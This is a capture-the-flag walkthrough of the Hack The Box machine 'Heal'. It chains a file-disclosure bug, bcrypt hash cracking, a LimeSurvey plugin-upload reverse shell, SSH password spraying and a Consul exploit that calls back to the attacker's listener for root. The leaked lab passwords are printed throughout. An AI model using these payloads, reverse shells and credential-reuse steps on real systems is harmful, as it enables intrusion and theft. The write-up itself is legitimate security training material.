# Heal

First let’s enumerate the machine:

```bash
sudo nmap -sC -sV 10.10.11.46

result:
PORT   STATE SERVICE VERSION

```

Let’s add the domain to /etc/hosts. Let’s start burp, turn on foxy proxy and visit the site.

After landing on the site, there’s a login page. We attempt default credential admin:admin, and it did not work. There’s a sign up function, let’s attempt to sign up.

![image.png]({{ site.baseurl }}/assets/heal/image.png)

Looking at burp, we go to event log at the bottom left corner, we see a error request to a subdomain:

![image.png]({{ site.baseurl }}/assets/heal/image%201.png)

Let’s add that to our /etc/hosts and try signing up again.

Visiting api.heal.htb also reveal to us the version of Ruby and Rails:

![image.png]({{ site.baseurl }}/assets/heal/image%202.png)

We also see a link to take us to a survey site. When clicked, we find a new subdomain, take-survey.heal.htb. Let’s add that to our hosts file and visit the site. 

![image.png]({{ site.baseurl }}/assets/heal/image%203.png)

Viewing the page source, we see:

```bash
<!DOCTYPE html>
<html lang="en" dir="ltr" class="en dir-ltr  no-js " >
            
    

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="LimeSurvey http://www.limesurvey.org" />
```

Searching up LimeSurvey, we see it’s an open source survey tool. Since it’s open source, let’s go search limesurvey github and see if that yields anything interesting results such as finding out the version that the site is running. By looking at the layout of the github page, we can test if the same layout of directories are on the site e.g. let’s test to see if a [README.md](http://README.md) exists.

```bash
http://take-survey.heal.htb/README.md
```

We get a download prompt; it exists. Now, looking in the docs/ folder, we see a release-notes.txt, let’s see if that exposes the version of limesurvey the target site is running.

```bash
http://take-survey.heal.htb/docs/release_notes.txt
```

The latest in the changelog suggest that the version the target site is using is 6.6.4:

```bash
Changes from 6.6.3 (build 240909) to 6.6.4 (build 240923) September 23, 2024
```

Let’s search up if there are any exploit online. There’s a RCE but it requires admin access which we don’t have.

Going back to the website, we see a resume builder, and we can export a pdf. Let’s try and intercept the request on Burp

![image.png]({{ site.baseurl }}/assets/heal/image%204.png)

![image.png]({{ site.baseurl }}/assets/heal/image%205.png)

We see a request with a potential file disclosure vulnerability on the filename parameter. Let’s send that to repeater and confirm our findings. Switching the file name to /etc/passwd, it worked.

![image.png]({{ site.baseurl }}/assets/heal/image%206.png)

We can copy and paste the usernames into a new file and find the users with sh (that will filter the users that can login) and put it into a new file:

```bash
grep sh$ passwd | awk -F : '{print $1}' > users.txt

result:
root
ralph
postgres
ron
```

Since we have the file disclosure, let’s see if we can find credentials in the configuration file. Knowing the app using Ruby, let’s first see what’s in the Gemfile which tells us what dependencies the app needs:

![image.png]({{ site.baseurl }}/assets/heal/image%207.png)

We see the site is using sqlite3. Let’s find that database file, before that, we have to confirm the location; You can confirm or change this in your Rails app’s database configuration file:

```bash
config/database.yml
```

![image.png]({{ site.baseurl }}/assets/heal/image%208.png)

Now let’s download the database file. Highlight only the sqlite3 part without the HTTP header and right-click, and click on copy to file and save it:

![image.png]({{ site.baseurl }}/assets/heal/image%209.png)

Now edit the file to delete the HTTP headers and attempt to dump the sqlite3 database:

```bash
sqlite3 database.sqlite3 .dump

result:
INSERT INTO users VALUES(1,'ralph@heal.htb','$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG','2024-09-27 07:49:31.614858','2024-09-27 07:49:31.614858','Administrator','ralph',1);
```

Let’s attempt to crack the hash. Let’s let hashcat first detect the hash to crack

```bash
hashcat.exe "hashcat-6.2.6\wordlists\hash.txt" "wordlists\rockyou.txt"

result:
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

Let’s decrypt it:

```bash
hashcat.exe -m 3200 "wordlists\hash.txt" "wordlists\rockyou.txt" #147258369

```

Now we have the password, let’s attempt to log on to the website again, we can also see if the same password is used for ssh is login, as we saw the user ralph on /etc/passwd earlier; ssh did not work.

Also from the database, we can infer ralph is an administrator, which means we can try out the RCE on limesurvey. [https://ine.com/blog/cve-2021-44967-limesurvey-rce](https://ine.com/blog/cve-2021-44967-limesurvey-rce)

Now going back to the site, we visit take-suvey.heal.htb/admin we get redirected to administrator login, let’s login as ralph.

As admin, we have the ability to upload zip files for plugins. Let’s follow the RCE writeup and attempt to upload a reverse shell. 

![image.png]({{ site.baseurl }}/assets/heal/image%2010.png)

And we clone this github repo:

```bash
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
```

And we change the IP in the reverse shell file to our own IP. Also, in the config.xml file, we have to change the version to 6.6.4:

```bash
        <version>6.6.4</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>

```

```bash
zip -r plugin.zip config.xml php-rev.php
```

Now back on the admin panel, let’s upload the file and activate it 

![image.png]({{ site.baseurl }}/assets/heal/image%2011.png)

Now Go url+{upload/plugins/#Name/#Shell_file_name}

```bash
http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php
```

We have a shell:

![image.png]({{ site.baseurl }}/assets/heal/image%2012.png)

Now let’s upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now let’s check the configuration file:

```bash
/var/www/html/limesurvey/application/config/config.php

result:
'components' => array(                                                                                                                            
                'db' => array(                                                                                                                            
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',                     
                        'emulatePrepare' => true,                                                                                                         
                        'username' => 'db_user',                                                                                                          
                        'password' => 'AdmiDi0_pA$$w0rd',                                                                                                 
                        'charset' => 'utf8',                                                                                                              
                        'tablePrefix' => 'lime_',
```

We find a postgresql database. Let’s connect to it

```bash
PGPASSWORD='AdmiDi0_pA$$w0rd' psql -h localhost -p 5432 -U db_user -d survey
```

Nothing of interest is on there except for lime_users which shows the hash password of ralph, which we already cracked. Let’s try password spraying the new password with nxc:

```bash
nxc ssh heal.htb -u users.txt -p 'AdmiDi0_pA$$w0rd'

result:
SSH         10.10.11.46     22     heal.htb         [+] ron:AdmiDi0_pA$$w0rd  Linux - Shell access!

```

Now let’s log on.

```bash
ssh ron@heal.htb

```

Seeing what ports are listening on the machine:

```bash
ss -lntp

result:

```

And if we contextualise this with the processes that are running:

```bash
root        1772       1  0 May22 ?        00:08:23 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul
```

We see consul, which is a service networking solution. 

Let’s try curling the open ports and see which one gets us a reply:

```bash
curl localhost:8500 -v 

result:
*   Trying 127.0.0.1:8500...
* Connected to localhost (127.0.0.1) port 8500 (#0)
> GET / HTTP/1.1
> Host: localhost:8500
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=utf-8

< Content-Length: 39
< 
<a href="/ui/">Moved Permanently</a>.

* Connection #0 to host localhost left intact
```

We can enable port forwarding:

```bash
ssh ron@heal.htb -L 8500:localhost:8500
```

Now we can visit the site on our attack host.

![image.png]({{ site.baseurl }}/assets/heal/image%2013.png)

We also see the version on the bottom left corner v.1.19.2.

We can get the path of consul by:

```bash
 systemctl status consul
 
 result:

Warning: some journal files were not opened due to insufficient permissions.
```

Now let’s see if there are any exploit for this version of consul:

[https://www.exploit-db.com/exploits/51117](https://www.exploit-db.com/exploits/51117)

Let’s download the exploit and run it:

```bash
python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport> <acl_token>\n")
```

We just need the acl_token to run it. We can get it by first looking at the consul service file:

```bash
cat /etc/systemd/system/consul.service

result:
[Service]
User=root
Group=root
ExecStart=/usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
Restart=on-failure
ExecReload=/bin/kill --signal HUP $MAINPID
KillMode=process
KillSignal=SIGTERM
SyslogIdentifier=consul
[Install]
WantedBy=multi-user.target

```

Now we see the configuration dir, and we see a json file

```bash
cd /etc/consul.d
cat config.json

result:
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="

```

The last encrypt line is the acl_token. Now let’s start a listener and run our exploit 

```bash
nc -lnvp 9001

python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport> <acl_token>\n")

python3 exploit.py localhost 8500 10.10.16.2 9001 "l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="

```

We got root shell!
